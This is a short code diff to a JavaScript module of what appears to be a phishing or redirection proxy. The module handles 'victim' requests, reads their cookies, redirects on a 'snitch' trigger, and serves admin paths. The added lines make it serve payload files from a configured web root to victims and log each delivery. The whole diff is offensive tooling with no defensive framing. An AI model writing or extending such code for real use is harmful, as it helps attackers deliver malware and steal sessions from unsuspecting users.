@@ -5,6 +5,7 @@ module.exports = {
       var primary = domain.primary_target
       var secondary = domain.secondary_target
       var full_path = victim_request.headers.host + url.parse(victim_request.url).path
+      var file_name = url.parse(victim_request.url).pathname.split('/').pop()
       var cookie = victim_request.headers.cookie
       if (full_path.includes(domain.snitch.snitch_string)){
         console.log(success + "Snitch triggered. Redirecting to: " + domain.snitch.redirect_url)
@@ -14,6 +15,15 @@ module.exports = {
           target: domain.snitch.redirect_url
         }
       } 
+
+      if (full_path.includes(domain.wwwroot)){
+        console.log(success + "Sent a Payload: " + full_path)
+        access_log.write("[+] Sent a Payload: " + full_path + "\n")
+        return {
+          target_type: "payload",
+          target: file_name
+        }
+      }  
 
       if (admin_config.set_admin.switch){
         if (full_path.includes(admin_config.set_admin.search_string)){
